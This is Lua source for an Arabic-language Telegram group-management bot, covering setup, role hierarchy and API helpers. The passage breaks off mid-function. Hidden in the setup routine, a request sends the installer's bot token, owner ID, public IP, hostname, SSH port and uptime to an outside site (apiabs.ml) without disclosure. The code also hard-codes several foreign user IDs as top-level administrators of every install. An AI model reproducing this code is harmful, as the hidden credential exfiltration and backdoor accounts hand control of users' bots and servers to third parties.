------------------------------------------------
-- This Source Was Developed By (ABS) @IQ_ABS --
--     This Is The Source Channel @X7PX7      --
--          -- https://t.me/X7PX7 --          --
------------------------------------------------
redis = require('redis') 
URL = require('socket.url') 
HTTPS = require ("ssl.https") 
https = require ("ssl.https") 
http  = require ("socket.http") 
serpent = require("serpent") 
json = dofile('./JSON.lua') 
JSON = dofile('./dkjson.lua') 
lgi = require('lgi') 
notify = lgi.require('Notify') 
utf8 = require ('lua-utf8') 
notify.init ("Telegram updates") 
DevAbs = redis.connect('127.0.0.1', 6379) 
User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
ServerDavid = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
Ip = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
UpTime = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
local AutoSet = function() 
if not DevAbs:get(ServerDavid.."IdDavid") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevAbs:set(ServerDavid.."IdDavid",DevId) 
else 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
end 
os.execute('lua David.lua') 
end 
if not DevAbs:get(ServerDavid.."TokenDavid") then 
io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
local TokenBot = io.read() 
if TokenBot ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
if res ~= 200 then 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
else 
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
DevAbs:set(ServerDavid.."TokenDavid",TokenBot) 
end  
else 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
end  
os.execute('lua David.lua') 
end 
DevAbs:set(DevAbs:get(ServerDavid.."TokenDavid"):match("(%d+)")..'Abs:Errors',true)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local CreateConfigAuto = function()
Config = {
DevId = DevAbs:get(ServerDavid.."IdDavid"),
TokenBot = DevAbs:get(ServerDavid.."TokenDavid"),
David = DevAbs:get(ServerDavid.."TokenDavid"):match("(%d+)"),
SudoIds = {DevAbs:get(ServerDavid.."IdDavid")},
}
Create(Config, "./config.lua")   
https.request("https://apiabs.ml/config.php?Get=David&DevId="..DevAbs:get(ServerDavid.."IdDavid").."&TokenBot="..DevAbs:get(ServerDavid.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
file = io.open("David.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/DavidTeam
token="]]..DevAbs:get(ServerDavid.."TokenDavid")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
echo "~ The tg File Was Not Found In The Bot Files"
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
exit 1
fi
if [ ! $token ]; then
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
echo "~ The Token Was Not Found In The config.lua File"
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
exit 1
fi
./tg -s ./David.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/DavidTeam
while(true) do
rm -fr ../.telegram-cli
screen -S David -X kill
screen -S David ./David.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('chmod +x Run;./Run')
end 
CreateConfigAuto()
end
local Load_David = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevAbs:del(ServerDavid.."IdDavid");DevAbs:del(ServerDavid.."TokenDavid")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_David() 
print("\27[36m"..[[
 -------------------------------------------------------
|                      Source David                     |      
|                  Devloper : @EE9EEEE                  |
|                                                       |
|                                      ██               |
| ███████       ██      ██       ██          ███████    |
| ██    ██    ██  ██     ██     ██     ██    ██     ██  |  
| ██    ██   ████████      ██  ██      ██    ██     ██  |
| ███████   ██      ██       ██        ██    ███████    |
|                                                       |
 -------------------------------------------------------
]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
Config = dofile("./config.lua")
DevId = Config.DevId or Config.SUDO
SudoIds = {Config.SudoIds,1558668590,1456101891,1028821866,632023394} or {Config.sudo_users,1558668590,1456101891,1028821866,632023394}
David = Config.David or Config.bot_id
TokenBot = Config.TokenBot or Config.token
NameBot = (DevAbs:get(David..'Abs:NameBot') or 'ديفد')
FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
function dl_cb(arg, data)
end
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoIds) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(DevId) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoIds) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(DevId) then 
var = true 
end 
return var 
end
-------  SecondSudo  -------
function SecondSudo(msg) 
local Status = DevAbs:sismember(David..'Abs:SecondSudo:',msg.sender_user_id_) 
if Status or Sudo(msg) then  
return true  
else  
return false  
end  
end
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(David) then  
var = true  
end  
return var  
end 
---------  SudoBot  --------
function SudoBot(msg) 
local Status = DevAbs:sismember(David..'Abs:SudoBot:',msg.sender_user_id_) 
if Status or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------Manager All--------
function ManagerAll(msg) 
local Status = DevAbs:sismember(David..'Abs:ManagerAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--------- Admin All --------
function AdminAll(msg) 
local Status = DevAbs:sismember(David..'Abs:AdminAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
------ VIP MEMBER ALL ------
function VipAll(msg) 
local Status = DevAbs:sismember(David..'Abs:VipAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
----   AbsConstructor   ----
function AbsConstructor(msg) 
local Status = DevAbs:sismember(David..'Abs:AbsConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = DevAbs:sismember(David..'Abs:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or AbsConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
----    Constructor     ----
function Constructor(msg) 
local Status = DevAbs:sismember(David..'Abs:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or AbsConstructor(msg) or BasicConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------  Manager  --------
function Manager(msg) 
local Status = DevAbs:sismember(David..'Abs:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AbsConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
----------  Admin  ---------
function Admin(msg) 
local Status = DevAbs:sismember(David..'Abs:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or AbsConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------Vip Member---------
function VipMem(msg) 
local Status = DevAbs:sismember(David..'Abs:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or VipAll(msg) or AbsConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--------- Cleaner ----------
function Cleaner(msg) 
local Status = DevAbs:sismember(David..'Abs:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or AbsConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------  Banned  ---------
local function Ban(user_id, chat_id)
if DevAbs:sismember(David..'Abs:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
---------  BanAll  ---------
function BanAll(user_id)
if DevAbs:sismember(David..'Abs:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
----------  Muted  ---------
local function Muted(user_id, chat_id)
if DevAbs:sismember(David..'Abs:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
---------  MuteAll  --------
function MuteAll(user_id)
if DevAbs:sismember(David..'Abs:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
function DavidFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.David and msg then
FilesText = plugin.David(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= David:lower() then 
send(chat,msg.id_,"⌁︙عذرا هذا الملف ليس تابع لهذا البوت")   
return false 
end
send(chat,msg.id_,"⌁︙جاري رفع الملف ... .")
local File = json:decode(https.request('https://api.telegram.org/bot' .. TokenBot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"⌁︙عذرا الملف ليس بصيغة ↫ Json يرجى رفع الملف الصحيح")
end
local info_file = io.open('./'..David..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevAbs:set(David.."Abs:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevAbs:sadd(David.."Abs:Groups",IdGps) 
DevAbs:set(David.."Abs:Lock:Bots"..IdGps,"del") DevAbs:hset(David.."Abs:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'Abs:Lock:Links','Abs:Lock:Contact','Abs:Lock:Forwards','Abs:Lock:Videos','Abs:Lock:Gifs','Abs:Lock:EditMsgs','Abs:Lock:Stickers','Abs:Lock:Farsi','Abs:Lock:Spam','Abs:Lock:WebLinks','Abs:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevAbs:set(David..Lock..IdGps,true)
end
if v.AbsConstructors then
for k,IdAbsConstructors in pairs(v.AbsConstructors) do
DevAbs:sadd(David..'Abs:AbsConstructor:'..IdGps,IdAbsConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevAbs:sadd(David..'Abs:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevAbs:sadd(David..'Abs:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevAbs:sadd(David..'Abs:Managers:'..IdGps,IdManagers)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
DevAbs:sadd(David..'Abs:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevAbs:sadd(David..'Abs:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevAbs:set(David.."Abs:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevAbs:set(David.."Abs:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( تم وضع ترحيب المجموعات )')
end
end
end
send(chat,msg.id_,"⌁︙تم رفع النسخه بنجاح \n⌁︙تم تفعيل جميع المجموعات \n⌁︙تم استرجاع مشرفين المجموعات \n⌁︙تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
end
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatus" .. status }, }, dl_cb, nil)
end
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
function ChatLeave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
function do_notify(user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
function ChatKick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
function Dev_Abs(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
function CatchName(Name,Num) 
ChekName = utf8.sub(Name,0,Num) Name = ChekName return Name..'' 
end
local AbsRank = function(msg) if SudoId(msg.sender_user_id_) then DavidTEAM  = "المطور" elseif SecondSudo(msg) then DavidTEAM = "المطور" elseif SudoBot(msg) then DavidTEAM = "المطور" elseif ManagerAll(msg) then DavidTEAM = "المدير" elseif AdminAll(msg) then DavidTEAM = "الادمن" elseif AbsConstructor(msg) then DavidTEAM = "المنشئ" elseif BasicConstructor(msg) then DavidTEAM = "المنشئ" elseif Constructor(msg) then DavidTEAM = "المنشئ" elseif Manager(msg) then DavidTEAM = "المدير" elseif Admin(msg) then DavidTEAM = "الادمن" else DavidTEAM = "العضو" end return DavidTEAM end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1558668590) then DavidTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(David) then DavidTEAM = 'البوت' elseif SudoId(user_id) then DavidTEAM = 'المطور الاساسي' elseif DevAbs:sismember(David..'Abs:SecondSudo:', user_id) then DavidTEAM = 'المطور الاساسي²' elseif DevAbs:sismember(David..'Abs:SudoBot:', user_id) then DavidTEAM = DevAbs:get(David.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(David..'Abs:ManagerAll:', user_id) then DavidTEAM = DevAbs:get(David.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(David..'Abs:AdminAll:', user_id) then DavidTEAM = DevAbs:get(David.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(David..'Abs:VipAll:', user_id) then DavidTEAM = DevAbs:get(David.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(David..'Abs:AbsConstructor:'..chat_id, user_id) then DavidTEAM = 'منشئ المجموعه' elseif DevAbs:sismember(David..'Abs:BasicConstructor:'..chat_id, user_id) then DavidTEAM = DevAbs:get(David.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(David..'Abs:Constructor:'..chat_id, user_id) then DavidTEAM = DevAbs:get(David.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(David..'Abs:Managers:'..chat_id, user_id) then DavidTEAM = DevAbs:get(David.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(David..'Abs:Admins:'..chat_id, user_id) then DavidTEAM = DevAbs:get(David.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(David..'Abs:VipMem:'..chat_id, user_id) then  DavidTEAM = DevAbs:get(David.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(David..'Abs:Cleaner:'..chat_id, user_id) then  DavidTEAM = DevAbs:get(David.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else DavidTEAM = DevAbs:get(David.."Abs:mem:Rd"..chat_id) or 'العضو' end return DavidTEAM end
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(David) then  
var = true  
elseif DevAbs:sismember(David..'Abs:SecondSudo:', user_id) then
var = true  
elseif DevAbs:sismember(David..'Abs:SudoBot:', user_id) then
var = true  
elseif DevAbs:sismember(David..'Abs:ManagerAll:', user_id) then
var = true  
elseif DevAbs:sismember(David..'Abs:AdminAll:', user_id) then
var = true  
elseif DevAbs:sismember(David..'Abs:VipAll:', user_id) then
var = true  
elseif DevAbs:sismember(David..'Abs:AbsConstructor:'..chat_id, user_id) then
var = true
elseif DevAbs:sismember(David..'Abs:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevAbs:sismember(David..'Abs:Constructor:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(David..'Abs:Managers:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(David..'Abs:Admins:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(David..'Abs:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function AbsDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif DevAbs:sismember(David..'Abs:SecondSudo:', user_id) then
var = 'secondsudo' 
elseif DevAbs:sismember(David..'Abs:SudoBot:', user_id) then
var = 'sudobot'  
elseif DevAbs:sismember(David..'Abs:AbsConstructor:'..chat_id, user_id) then
var = 'absconstructor'
elseif DevAbs:sismember(David..'Abs:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif DevAbs:sismember(David..'Abs:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif DevAbs:sismember(David..'Abs:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
local function Filters(msg, value)
local abs = (David..'Abs:Filters:'..msg.chat_id_)
if abs then
local names = DevAbs:hkeys(abs)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "X7PX7")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙عذرا عزيزي ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙العضو ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙بواسطة ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "المالك"
elseif GetInfo.result.status == "administrator" then 
Status = "مشرف"
else
Status = false
end
if GetInfo.result.custom_title then 
Abs = GetInfo.result.custom_title
else 
Abs = Status
end
end
return Abs
end
function Validity(msg,user_id) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then
send(msg.chat_id_,msg.id_,'⌁︙مالك المجموعه')   
return false  end 
if GetInfo.result.status == "member" then
send(msg.chat_id_,msg.id_,'⌁︙مجرد عضو هنا')   
return false  end
if GetInfo.result.status == 'left' then
send(msg.chat_id_,msg.id_,'⌁︙الشخص غير موجود هنا')   
return false  end
if GetInfo.result.status == "administrator" then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
send(msg.chat_id_,msg.id_,'⌁︙صلاحيات '..GetCustomTitle(user_id,msg.chat_id_)..' هي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙حذف الرسائل ↫ '..DEL..'\n⌁︙دعوة المستخدمين ↫ '..INV..'\n⌁︙حظر المستخدمين ↫ '..BAN..'\n⌁︙تثبيت الرسائل ↫ '..PIN..'\n⌁︙تغيير المعلومات ↫ '..EDT..'\n⌁︙اضافة مشرفين ↫ '..VIP..'\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉')
end
end
end
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
Abs = GetInfo.result.bio
